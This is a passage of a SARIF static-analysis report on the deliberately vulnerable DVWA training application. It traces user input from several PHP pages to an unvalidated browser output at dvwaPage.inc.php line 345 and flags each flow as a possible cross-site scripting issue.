                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:67 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:68 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:67 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:68 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Read $_POST['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:67 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:68 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 68
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4633",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "ADCABFEA4ACA2DAC519D142100EB094C"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:43 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:43 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:43 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:43 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Read $_POST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:7 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 7
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:43 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 43
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4644",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "B6AFE9B3388300ACBF7D2E34B693F108"
      },
      "locations" : [ {
